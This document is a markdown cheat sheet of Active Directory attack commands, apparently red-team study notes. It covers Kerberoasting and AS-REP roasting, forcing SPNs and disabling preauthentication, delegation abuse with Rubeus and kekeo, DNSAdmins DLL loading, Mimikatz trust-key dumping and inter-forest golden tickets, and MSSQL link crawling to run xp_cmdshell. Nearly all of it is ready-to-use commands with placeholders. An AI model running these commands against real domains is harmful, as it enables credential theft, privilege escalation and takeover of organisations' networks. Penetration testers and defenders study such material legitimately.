# Kerberoasting
- Offline cracking of service accounts
- Kerberos Session ticket has server portion which is encrypted with the password hash of the service account. Makes it possible to request a ticket and do offline password attacks.
- Service accounts are often ignored (passwords are rarely changed)
- Password hashes of service accounts could be used to create silver tickets

## Active Directory PowerShell Module
|Command|Description|
|---|---|
|Get-ADUser -Filter {ServicePrincipalName -ne "\$null"} -Properties ServicePrincipalName|Find user accounts used as Service Accounts|

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "\$SPN"
```


## PowerView
|Command|Description|
|---|---|
|Get-NetUser -SPN|Find user accounts used as Service Accounts|
|Request-SPNTicket|Request TGS for cracking with john/hashcat|

## Cracking Service Account Password
```
python3 path/to/tgsrepcrack.py \$wordlist \$ticketfile
```

# AS-REP Roasting (Kerberos)
- If a user's UAC settings have "Do not require Kerberos preauthentication" it is possible to grab user's crackable AS-REP and attack it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well

## Active Directory PowerShell Module
|Command|Description|
|---|---|
|Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$True} -Properties DoesNotRequirePreAuth|Get Accounts with Kerberos Preauth disabled|

## PowerView
|Command|Description|
|---|---|
|Get-DomainUser -PreauthNotRequired -Verbose|Get accounts with Kerberos Preauth disabled|
|Invoke-ACLScanner -ResolveGUIDs \| \${\$\_.IdentityReferenceName -match "RDPUsers"}||
|Set-DomainObject -Identity \$Username -XOR @{useraccountcontrol=4194304} -Verbose|Disable Preauth requirements for specific user|
|Get-ASREPHash -User \$Username -Verbose|Request encrypted AS-REP for offline password attack|
|Invoke-ASREPRoast -Verbose|Enumerate all users with Kerberos preauth disabled and request a ticket (hash)|

# Set ServicePrincipalName
- With enough rights (GenericAll or GenericWrite), a target user's SPN can be set to anything (unique in the domain)
- We can request a TGS without special privileges and kerberoast the TGS
- If a user has a SPN, the account is being treated as a service and you can request an SPN

## Active Directory PowerShell Module
|Command|Description|
|---|---|
|Get-ADUser -Identity \$Username -Properties SericePrincipalName \| Select ServicePrincipalName|See if user has SPN set|
|Set-ADUser -Identity \$Username -ServicePrincipalNames @{Add=\$SPN'}|Set SPN for specified user|

## PowerView
|Command|Description|
|---|---|
|Invoke-ACLScanner -ResolveGUIDs |?{\$\_.IdentityReferenceName -match "\$GroupName"}|Enumerate permissions for a specified group on ACLs|
|Get-DomainUser -Identity \$Username \| Select serviceprincipalname | See if a user has a SPN set |
|Set-DomainObject -Identity \$Username -Set @{serviceprincipalname='\$SPN'} | Set SPN for specified user|
|Request-SPNTicket|Request SPN in john/hashcat attackable format|

## PowerShell Native
|Command|Description|
|---|---|
|Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "\$TargetSPN"|Request a SPN ticket|

# Unconstrained Delegation
- Allows the reuse of end-user credentials to access resources hosted on a different server (any service on any computer in the domain)
- Useful in multi-tier service or applications where Kerberos Double Hop is required
- When set for a particular service account, unconstrained delegation allows delegation to any service/resource on the domain as a user
- When enabled the DC places user's TGT inside the TGS. When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS for the server to reuse the user's TGT to access any other resource as the user.
    - If you're able to compromise the computer with unconstrained delegation and a Domain Admin or higher privileged user connects to the machine we can escalate privileges

## ActiveDirectory PowerShell Module
|Command|Description|
|---|---|
|Get-ADComputer -Filter {TrustedForDelegation -eq \$True}|Discover Domain Computers which have unconstrained delegation enabled|
|Get-ADUser -Filter {TrustedForDelegation -eq \$True}|Discover Users which are trusted for delegation|

## PowerView
|Command|Description|
|---|---|
|Get-NetComputer -UnConstrained| Discover Domain Computers with unconstrained delegation enabled|

# Constrained Delegation
- Allows the first hop server to request access to only specified services on specified computers
- Delegation occurs for not only the specified service but for any service running under the same account. No validation for the SPN specified.
    - If you have constrained delegation to a service on a specified machine, you can get a TGS from any service that also runs on that machine.
    - If you have compromised a system hash you can use that system hash to impersonate the local administrator account

## Active Directory Module
|Command|Description|
|---|---|
|Get-ADObject -Filter {msDs-AllowedToDelegateTo -ne "\$null"} -Properties msDS-AllowedToDelegateTo|Get Users and Computers with constrained delegation enabled|

## PowerView
|Command|Description|
|---|---|
|Get-DomainUser -TrustedToAuth|Get Users with constrained delegation enabled|
|Get-DomainComputer -TrustedToAuth|Get Computers with constrained delegation enabled|

# Writing Tickets

|Tool|Command|Description|
|---|---|---|
|kekeo|tgt::ask /user:\$Username /domain:\$DomainName /rc4:\$NTLMHashof\$Username|Request a TGT|
|kekeo|tgt::s4u /tgt:\$pathtotgtfile.kirbi /user:\$Username /service:\$Service | Request a TGS for \$Service|
|kekeo|tgt::s4u /tgt:\$PathTotgtfile.kirbi /service:\$SPN1\|\$SPN2|Request a TGS for \$Service1 and \$Service2|
|rubeus|rubeus.exe s4u /user:\$username /rc4:\$NTLMof\$username /impersonateuser:Administrator /msdsspn:"\$SPN" /ptt|Write and inject a ticket into memory for \$SPN as Administrator|
|rubeus|rubeus.exe s4u /user:\$username /rc4:\$NTLMof\$username /impersonateuser:Administrator /msdsspn:"\$SPN" /altservice:$altservice /ptt|Write and inject a ticket into memory for \$SPN and \$altservice as Administrator|

# Sensitive Groups

## DNSAdmins
- Members of the DNSAdmins group are allowed to load arbitrary DLLs with the privileges of dns.exe (SYSTEM)
- If the DNS server is also the domain controller, this provides escalation to Domain Admin
- Need privileges to restart the DNS Service
- RSAT DNS needs to be installed on foothold/attackers machine to usse dnscmd commandlet

|Command|Description|Needs RSAT DNS|
|---|---|---|
|dnscmd \$DomainController/\$DNSServer /config /serverlevelplugindll \\\\\$Share\\to\\thing.dll|Configure the dll for dns.exe|True|
|\$dnssettings = Get-DnsServerSetting -ComputerName \$DNSServerName -Verbose -All;\$dnssettings.ServerLevelPluginDll="\\\\\$Share\\to\\.dll";Set-DnsServerSetting -InputObject \$dnssettings -ComputerName \$DNSServerName -Verbose|Use DNSServer module to configure .dll for dns.exe|True|
|sc \\\\\$ComputerName stop dns|False|
|sc \\\\\$ComputerName start dns|False|

### Addt'l Notes
- mimilib.dll can be used, logs all DNS queries to C:\\Windows\\System32\\kiwidns.log (You can customize kdns.c and recompile to also make system calls when requests are logged and execute arbitrary code (make payload asynchronous (by default system calls are synchronous which will cause further DNS requests to fail after first log function call))
- Loading of DLLs leaves an Event ID 770 in the logs with full UNC path to the dll that was loaded.
- Technique leaves registry entries under:
  - HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ServerLevelPluginDll
  - HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ServerLevelPluginDll
- If you start the service and forget to share the .dll UNC path with everyone or you use your PC DNS name you can cause DNS resolution outages and more logs will be left
  - Event ID 150: DNS server could not load or initializae \$FullUNCPathToDll

# Cross-Forest Trusts

## Bidirectional Trusts
- When you present your TGT to Kerberos for a TGS that's in another forest, an inter-realm TGT is received and transferred over to the DC in the other forest
- Only validation that is performed by the other forest is if it can decrypt the inter-realm TGT with the Trust-Key
- After decryption, the DC in the other forest handles kerberos communication from there

|Tool|Command|Description|
|---|---|---|
|Invoke-Mimikatz|Invoke-Mimikatz -Command '"lsadump::trust /patch"'|Retrieve trust keys for inter-forest trusts|
|Invoke-Mimikatz|Invoke-Mimikatz -Command '"lsadump::lsa /patch"'|Retrieve trust keys for inter-forest trusts|
|Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:\$Domain /sid:\$DomainSID /rc4:\$TrustKeyNTLMHash /service:krbtgt /target:\$TargetDomain /ticket:\$PathToStoreTicket"'| Forge Inter-Forest TGT|
|asktgs|asktgs.exe \\\\\$PathToInterForestTGT \$TargetSPN|Request TGS for SPN|
|kirbikator|kirbikator.exe lsa .\\\$PathToTGS|Inject TGS into memory|

# MSSQL Servers
- Generally deployed in amounts > 1 in a Windows Domain
- Domain users can be mapped to database roles
- Database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources
- In case of database links between SQL servers, it is possible to execute stored procedures
- Database links work across forest trusts
- If rpcout is enabled, xp_cmdshell can be enabled

## Enable xp_cmdshell
```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "\$ServerName"
```

## MSSQL
| Query | Description |
| --- | --- |
| select \* from master..sysservers | Look for links to remote servers |
| select \* from openquery("\$ServerName",'\$query') | Run queries on linked database |
| select \* from openquery("\$ServerName",'select \* from openquery("\$ServerName","select \* from master..sysservers")') | Chain openquery queries to access nested links (links within links) |
| select \* from openquery("\$ServerName",'select \* from openquery("\$ServerName","select @@version as version;exec master..xp_cmdshell "\$Command")) | Chain openquery queries to execute commands on nested links (links within links) |

## PowerUpSQL

| Command | Description |
| --- | --- |
| Get-SQLInstanceDomain | Discover SQL SPNs |
| Get-SQLConnectionTestThreaded | Check Accessibility |
| Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose | Check Accessibility |
| Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose | Gather more information regarding the server and permissions |
| Get-SQLServerLink -Instance \$InstanceName -Verbose | Look for links to remote servers |
| Get-SQLServerLinkCrawl -Instance \$InstanceName -Verbose | Crawl links to remote servers |
| Get-SQLServerLinkCrawl -Instance \$InstanceName -Query "exec master..xp_cmdshell '\$Command'" | For each Link attempt to execute \$Command using xp_cmdshell |

